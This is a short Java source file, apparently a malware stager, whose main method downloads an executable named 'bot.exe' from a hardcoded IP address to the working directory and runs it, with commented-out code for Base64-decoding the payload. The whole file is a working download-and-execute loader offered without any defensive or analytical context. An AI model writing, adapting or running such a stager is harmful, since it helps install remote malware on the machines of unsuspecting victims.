package stager;

import java.io.*;
import java.util.Base64;

public class Main {
	public static void main(String args[]) throws InterruptedException, IOException,IllegalArgumentException
	{
	     String link = "http://157.230.227.120/bot.exe";
	     File payload_file = new File(System.getProperty("user.dir") + "/bot.exe");
	     
	     
	     //File payload_file2 = new File("decoded.exe");
	     
	    //Decodes the file
//	     BufferedReader br = new BufferedReader(new FileReader(payload_file));
//	     
//	     String main = null;
//	     
//	     String out;
//	     int count = 1;
//	     while((out = br.readLine()) != null)
//	     {
//	    	 //System.out.println(out);
//	    	 System.out.println("Reading " + (count));
//	    	 main += br;
//	    	 count++;
//	     }
//	     byte[] decoded;
//	     decoded = Base64.getDecoder().decode(main);
//	     FileOutputStream fos = new FileOutputStream("decoded.exe");
//	     fos.write(decoded);
	     
	    		 
	    System.out.println(payload_file);
	    Thread t = new Thread(new Downloader(link,payload_file));
	    t.start();
	    t.join();
	    
	    System.out.println("Starting execution");
	    Runtime r = Runtime.getRuntime();
	    try {
			r.exec(System.getProperty("user.dir") + "/bot.exe");
			System.out.println("Executed");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		}
	    
	}

}